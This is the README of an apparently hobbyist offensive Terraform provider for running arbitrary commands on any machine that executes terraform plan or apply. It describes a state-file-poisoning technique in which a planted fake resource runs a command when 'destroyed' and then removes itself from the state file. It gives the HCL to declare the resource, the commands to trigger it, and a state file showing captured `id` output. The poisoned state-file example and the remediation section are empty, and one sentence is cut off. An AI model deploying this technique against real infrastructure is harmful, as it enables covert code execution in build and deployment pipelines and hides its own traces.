# Terraform Provider for RCE via Statefile Poisoning

## What this is and major use cases

> This terraform provider can be used in two ways to execute arbitrary code on the machine that executes `terraform plan` or `terraform apply`:

1. **With write access to the terraform config files:**
  * You can use it like any other provider by declaring its use in the terraform config files. You declare a `rce` resource and specify which command to run, and the provider will take care of the execution.
  * There are tons of other ways to execute commands if you have write access to the terraform config files, but this provider adds the convenience of writing the output of the command to the state file in the `rce` resource, which might come in handy, if you have read access there.
2. **With write access to the state file:**
  * This is the way more interesting way. You can add a fake resource for this provider in the state file and specify a command to run there, and the next time someone executes terraform, this provider will be loaded to "destroy" that fake resource.
  * In the logic for "destroying" the resouce however, the specified command will be executed, and the fake resource will be purged from the state file.
  * Here, we sadly do not get the output written to the state file, otherwise terraform would throw errors about "inconsistencies". If you know how to do this, reach out to me or go ahead and open a PR please!

## How to use the provider

### With write access to the terraform config files

To use the provider stand alone, just declare this:

``` hcl
terraform {
  required_providers {
    example = {
      source = "example.com/local/example"
      version = "0.1.0"
    }
  }
}

resource "rce" "<arbitrary_name>" {
  command = "<command_to_run>"
}
```

Then, just:

``` bash
# this will initialize things, no execution of the command, yet
terraform init

# this will execute the command without writing its output to the state file
terraform plan

# this will execute the command with writing the output to the state file
terraform apply
```

For example, when running `id`, this is the resulting state file - note the result of the `id` command in the `resources.instances.attributes.output`:

```
{
  "version": 4,
  "terraform_version": "1.6.3",
  "serial": 1,
  "lineage": "3562b273-b289-bb7c-55b4-a69105fa4526",
  "outputs": {},
  "resources": [
    {
      "mode": "managed",
      "type": "rce",
      "name": "run_command",
      "provider": "provider[\"example.com/local/example\"]",
      "instances": [
        {
          "schema_version": 0,
          "attributes": {
            "command": "id",
            "id": "id",
            "output": "uid=1000(kali) gid=1000(kali)\n"
          },
          "sensitive_attributes": [],
          "private": "bnVsbA=="
        }
      ]
    }
  ],
  "check_results": null
}
```

### With write access to the state file

This is a minimal viable state file for the provider to run:

```

```

When injecting this into an existing state file, you of course only want the 

## How it works

## Remediation

## Why I do this

1. Because it's fun.
2. To learn stuff (see point 1).
3. Because I hope you might find this fun, too, and reach out with pull requests or comments, feauture requests, etc. This applies especially since:
  * I have not written `go` code before and I am sure the AI fuled soure I put together could be way nicer and especially resilient.
  * I would love to have a function to not write to the state file for use case 1 and to force writing to the statefile in use case 2. However, terraform does not like this, because it causes inconsistencies. If you know a way around that, hit me up, send a PR, all the things!